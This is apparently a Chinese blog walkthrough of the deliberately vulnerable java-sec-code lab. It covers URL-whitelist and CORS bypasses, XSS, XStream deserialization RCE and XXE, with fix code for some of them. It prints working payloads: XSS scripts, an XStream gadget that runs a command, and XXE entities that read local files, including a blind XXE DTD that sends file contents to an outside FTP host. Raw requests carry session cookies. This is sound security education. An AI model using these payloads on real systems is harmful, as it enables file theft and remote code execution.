<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;regex&quot;)</span><br><span class="line">public String regex(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line">    Pattern p &#x3D; Pattern.compile(&quot;joychouorg&quot;);</span><br><span class="line">    Matcher m &#x3D; p.matcher(host);</span><br><span class="line"></span><br><span class="line">    if (m.find()) &#123;</span><br><span class="line">        return &quot;Good url.&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;Bad url.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027151840814.png" alt="image-20211027151840814"></p>
<h4 id="5-正则匹配URL是否以-joychou-com"><a href="#5-正则匹配URL是否以-joychou-com" class="headerlink" title="5.正则匹配URL是否以.joychou.com"></a>5.正则匹配URL是否以.joychou.com</h4><p>正则为<code>.*\\.joychou.com$</code>的情况，之前的这两种<code>xxx.xxxjoychou.com</code>和<code>xxx.joychou.com.xxx</code>都不能绕过了。</p>
<p>Bypass Poc：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.baidu.com&#x2F;?xxx.joychou.com</span><br></pre></td></tr></table></figure>

<h3 id="4-安全代码和测试环境"><a href="#4-安全代码和测试环境" class="headerlink" title="4.安全代码和测试环境"></a>4.安全代码和测试环境</h3><p>安全代码逻辑很简单：</p>
<ul>
<li>取一级域名</li>
<li>判断一级域名是否在白名单里。</li>
</ul>
<p>方法调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] urlwhitelist = &#123;<span class="string">&quot;joychou.com&quot;</span>, <span class="string">&quot;joychou.me&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (!UrlSecCheck(url, urlwhitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<p>方法代码：</p>
<p>需要先添加guava库（目的是获取一级域名）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>21.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">public static Boolean UrlSecCheck(String url, String[] urlwhitelist) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u = new URL(url);</span><br><span class="line">        // 只允许http和https的协议</span><br><span class="line">        if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) &#123;</span><br><span class="line">            return  false;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取域名，并转为小写</span><br><span class="line">        String host = u.getHost().toLowerCase();</span><br><span class="line">        // 获取一级域名</span><br><span class="line">        String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString();</span><br><span class="line"></span><br><span class="line">        for (String whiteurl: urlwhitelist)&#123;</span><br><span class="line">            if (rootDomain.equals(whiteurl)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;sec&quot;)</span><br><span class="line">public String sec(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    String whiteDomainlists[] &#x3D; &#123;&quot;joychou.org&quot;, &quot;joychou.com&quot;, &quot;test.joychou.me&quot;&#125;;</span><br><span class="line"></span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;SecurityUtil is not http or https&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    for (String whiteHost: whiteDomainlists)&#123;</span><br><span class="line">        if (whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.endsWith(whiteHost)) &#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125; else if (!whiteHost.startsWith(&quot;.&quot;) &amp;&amp; host.equals(whiteHost)) &#123;</span><br><span class="line">            return url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;sec&#x2F;array_indexOf&quot;)</span><br><span class="line">public String sec_array_indexOf(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Define muti-level host whitelist.</span><br><span class="line">    ArrayList&lt;String&gt; whiteDomainlists &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">    whiteDomainlists.add(&quot;bbb.joychou.org&quot;);</span><br><span class="line">    whiteDomainlists.add(&quot;ccc.bbb.joychou.org&quot;);</span><br><span class="line"></span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;SecurityUtil is not http or https&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">    if (whiteDomainlists.indexOf(host) !&#x3D; -1) &#123;</span><br><span class="line">        return &quot;Good url.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;Bad url.&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-CORS绕过"><a href="#5-CORS绕过" class="headerlink" title="5.CORS绕过"></a>5.CORS绕过</h3><p>先来看看<code>Access-Control-Allow-Origin</code>的使用。一般有两种方式设置该值：</p>
<ul>
<li>后端代码设置</li>
<li>Nginx等Web服务器设置</li>
</ul>
<p>域名设置<code>test.joychou.org</code>如下，表示该域名只接受来自<code>http://blacktech.com</code>的请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_header  Access-Control-Allow-Origin &#39;http:&#x2F;&#x2F;blacktech.com&#39;;</span><br></pre></td></tr></table></figure>

<p>本地写一份请求<code>test.joychou.org</code>的代码，保存为1.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;jquery&#x2F;3.3.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">        type: &#39;GET&#39;,</span><br><span class="line">        url: &#39;http:&#x2F;&#x2F;test.joychou.org&#39;,</span><br><span class="line">        success: function (data) &#123;</span><br><span class="line">            alert(data);</span><br><span class="line">            console.log(&#39;Yeah! Load Success.&#39;);</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function (error) &#123;</span><br><span class="line">            alert(&#39;Oh,no! Load Failed.&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>请求<code>http://localhost/1.html</code>报错如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Failed to load http:&#x2F;&#x2F;test.joychou.org&#x2F;: The &#39;Access-Control-Allow-Origin&#39; header has a value &#39;http:&#x2F;&#x2F;blacktech.com&#39; that is not equal to the supplied origin. Origin &#39;http:&#x2F;&#x2F;localhost&#39; is therefore not allowed access.</span><br></pre></td></tr></table></figure>

<p>改下<code>/etc/hosts</code>，把 localhost 改成 blacktech.com，请求<code>http://blacktech.com/1.html</code>就不会报错了，而且能获取到<br><a href="http://test.joychou.org/">http://test.joychou.org</a> 的返回内容<code>It works.</code></p>
<p>我们来看看<code>origin</code>，这个值和Referer一样，前端不能设置，如果<code>http://baidu.com</code>对<code>http://test.joychou.org</code>发起一个跨域请求，那么<code>origin</code>的值就为<code>http://baidu.com</code>。</p>
<p>那么问题来了，如果<code>Access-Control-Allow-Origin</code>设置的域名能被绕过，那么用请求header里的<code>origin</code>绕即可。绕过后，就能获取接口的数据，和JSONP一样。</p>
<h2 id="18-XSS"><a href="#18-XSS" class="headerlink" title="18.XSS"></a>18.XSS</h2><p>XSS作者提供了两种利用场景</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;reflect&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String reflect(String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;reflect?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153333287.png" alt="image-20211027153333287"></p>
<p>这里还展示一种将XSS语句带入cookie，然后在其他处调出造成XSS的可能性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;stored&#x2F;store&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String store(String xss, HttpServletResponse response) &#123;</span><br><span class="line">    Cookie cookie &#x3D; new Cookie(&quot;xss&quot;, xss);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">    return &quot;Set param into cookie&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@RequestMapping(&quot;&#x2F;stored&#x2F;show&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;</span><br><span class="line">    return xss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>依次访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;stored&#x2F;store?xss&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;xss&#x2F;stored&#x2F;show</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027153527388.png" alt="image-20211027153527388"></p>
<p>修复代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;safe&quot;)</span><br><span class="line">@ResponseBody</span><br><span class="line">public static String safe(String xss) &#123;</span><br><span class="line">    return encode(xss);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static String encode(String origin) &#123;</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&lt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&gt;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;\&quot;&quot;, &quot;&quot;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);</span><br><span class="line">    origin &#x3D; StringUtils.replace(origin, &quot;&#x2F;&quot;, &quot;&#x2F;&quot;);</span><br><span class="line">    return origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将特殊字符进行转译</p>
<h2 id="19-XStreamRCE"><a href="#19-XStreamRCE" class="headerlink" title="19.XStreamRCE"></a>19.XStreamRCE</h2><blockquote>
<p>XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。</p>
<p>Xstream具有以下优点</p>
<ul>
<li>使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。</li>
<li>无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。</li>
<li>性能 - XStream快速和低内存占用，适合于大对象图或系统。</li>
<li>干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。</li>
<li>不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。</li>
<li>完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。</li>
<li>可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。</li>
<li>安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。</li>
<li>错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。</li>
<li>另一种输出格式 - XStream支持其它的输出格式，如JSON。</li>
</ul>
</blockquote>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    @PostMapping(&quot;&#x2F;xstream&quot;)</span><br><span class="line">    public String parseXml(HttpServletRequest request) throws Exception &#123;</span><br><span class="line">        String xml &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">        XStream xstream &#x3D; new XStream(new DomDriver());</span><br><span class="line">        xstream.fromXML(xml);</span><br><span class="line">        return &quot;xstream&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user &#x3D; new User();</span><br><span class="line">        user.setId(0);</span><br><span class="line">        user.setUsername(&quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">        XStream xstream &#x3D; new XStream(new DomDriver());</span><br><span class="line">        String xml &#x3D; xstream.toXML(user); &#x2F;&#x2F; Serialize</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        user &#x3D; (User) xstream.fromXML(xml); &#x2F;&#x2F; Deserialize</span><br><span class="line">        System.out.println(user.getId() + &quot;: &quot; + user.getUsername());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造请求包如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xstream HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;7BBEAB4E7FC8E7B10575631B0CA5413C; XSRF-TOKEN&#x3D;820fd620-2c78-424b-a852-93ca40553975; remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 445</span><br><span class="line"></span><br><span class="line">&lt;sorted-set&gt;  </span><br><span class="line">  &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;dynamic-proxy&gt; &lt;!-- --&gt;</span><br><span class="line">    &lt;interface&gt;java.lang.Comparable&lt;&#x2F;interface&gt;</span><br><span class="line">    &lt;handler class&#x3D;&quot;java.beans.EventHandler&quot;&gt;</span><br><span class="line">      &lt;target class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">        &lt;command&gt;</span><br><span class="line">          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">          &lt;string&gt;&#x2F;System&#x2F;Applications&#x2F;Calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">        &lt;&#x2F;command&gt;</span><br><span class="line">      &lt;&#x2F;target&gt;</span><br><span class="line">      &lt;action&gt;start&lt;&#x2F;action&gt;</span><br><span class="line">    &lt;&#x2F;handler&gt;</span><br><span class="line">  &lt;&#x2F;dynamic-proxy&gt;</span><br><span class="line">&lt;&#x2F;sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027154504421.png" alt="image-20211027154504421"></p>
<ol>
<li><a href="https://www.cnblogs.com/303donatello/p/13998245.html">CVE-2020-26217 | XStream远程代码执行漏洞</a></li>
<li><a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/">通过XStream对象反序列化的RCE</a></li>
<li><a href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析</a></li>
</ol>
<h2 id="20-XXE"><a href="#20-XXE" class="headerlink" title="20.XXE"></a>20.XXE</h2><p>XXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。</p>
<p>核心代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;DocumentBuilder&#x2F;vuln01&quot;, method &#x3D; RequestMethod.POST)</span><br><span class="line">public String DocumentBuilderVuln01(HttpServletRequest request) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        String body &#x3D; WebUtils.getRequestBody(request);</span><br><span class="line">        logger.info(body);</span><br><span class="line">        DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();</span><br><span class="line">        DocumentBuilder db &#x3D; dbf.newDocumentBuilder();</span><br><span class="line">        StringReader sr &#x3D; new StringReader(body);</span><br><span class="line">        InputSource is &#x3D; new InputSource(sr);</span><br><span class="line">        Document document &#x3D; db.parse(is);  &#x2F;&#x2F; parse xml</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 遍历xml节点name和value</span><br><span class="line">        StringBuilder buf &#x3D; new StringBuilder();</span><br><span class="line">        NodeList rootNodeList &#x3D; document.getChildNodes();</span><br><span class="line">        for (int i &#x3D; 0; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode &#x3D; rootNodeList.item(i);</span><br><span class="line">            NodeList child &#x3D; rootNode.getChildNodes();</span><br><span class="line">            for (int j &#x3D; 0; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                Node node &#x3D; child.item(j);</span><br><span class="line">                buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sr.close();</span><br><span class="line">        return buf.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">        return EXCEPT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有回显的利用方式</p>
<p>输入对应的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln01 HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN&#x3D;3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID&#x3D;598DC30E191F87CCFD005A39436FD289; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;book id&#x3D;&quot;1&quot;&gt;		</span><br><span class="line">	&lt;name&gt;Good Job&lt;&#x2F;name&gt;		</span><br><span class="line">	&lt;author&gt;ol4three&lt;&#x2F;author&gt;		</span><br><span class="line">	&lt;year&gt;2021&lt;&#x2F;year&gt;		</span><br><span class="line">	&lt;price&gt;100.00&lt;&#x2F;price&gt;	</span><br><span class="line">&lt;&#x2F;book&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163512520.png" alt="image-20211027163512520"></p>
<p>利用file协议读取文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;java_sec_code_war&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln01 HTTP&#x2F;1.1</span><br><span class="line">Host: test.ol4three.com:8080</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;94.0.4606.81 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYzNjUwOTQzNjE4OTplZWMwOGQ2MmY1M2JiZDIxM2MzYjM4NGE2OThlY2I0Yg; XSRF-TOKEN&#x3D;3693dcbc-f423-4c8b-af53-98bcbc639d8c; JSESSIONID&#x3D;598DC30E191F87CCFD005A39436FD289; __gads&#x3D;ID&#x3D;f3f270f7ceb2e609-2233066a20c4001e:T&#x3D;1602735684:RT&#x3D;1602735684:S&#x3D;ALNI_Mb8IpWdrljMYwyv7Bomgb0qFuZ73A</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Content-Length: 131</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE joychou [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;111.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027163556622.png" alt="image-20211027163556622"></p>
<p>在 XML 元素中，”&lt;” 和 “&amp;” 是非法的。”&lt;” 会产生错误，因为解析器会把该字符解释为新元素的开始。”&amp;” 也会产生错误，因为解析器会把该字符解释为字符实体的开始。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027164028767.png" alt="image-20211027164028767"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ cat 111.txt</span><br><span class="line">ol4three</span><br><span class="line">1111</span><br><span class="line">~!@#%^%&#39;&quot;&gt;</span><br><span class="line">2222</span><br><span class="line">&lt;%&amp;</span><br></pre></td></tr></table></figure>

<p>![image-20211027164104470](../../../../../../../Library/Application Support/typora-user-images/image-20211027164104470.png)</p>
<h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><blockquote>
<p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p>
<p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p>
</blockquote>
<p>简单一点的来说，将脚本代码定义为CDATA后，CDATA部分中的内容就会被解析器忽略，这个时候就可以读取文件了。</p>
<h3 id="1-有回显"><a href="#1-有回显" class="headerlink" title="1.有回显"></a>1.有回显</h3><p>本地主机：CDATA Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;tmp&#x2F;1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;test.ol4three.com:800&#x2F;evil.dtd&quot;&gt; %dtd;]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure>

<p>本地主机：evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>但我在测试用CDATA，并没有读取<code>&lt;&amp;</code>成功</p>
<h3 id="2-Bind-无回显"><a href="#2-Bind-无回显" class="headerlink" title="2.Bind 无回显"></a>2.Bind 无回显</h3><p>payloads：</p>
<ul>
<li>没有ENTITY关键字，可以用来Bypass WAF</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http:&#x2F;&#x2F;test.joychou.org&#x2F;evil.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>有ENTITY关键字，可能会被WAF拦截</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;test.joychou.org&#x2F;evil.dtd&quot;&gt;%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>evil.dtd代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;redhat-release&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;ftp:&#x2F;&#x2F;fakeuser:fakepass@test.joychou.org:2121&#x2F;%payload;&#39;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>

<p>或者将<code>%payload;</code>放在ftp的username或者password处。如果ftp不跟用户名或者密码<code>ftp://test.joychou.org:2121/%payload;</code>，利用FTP协议会接收到Java的版本。</p>
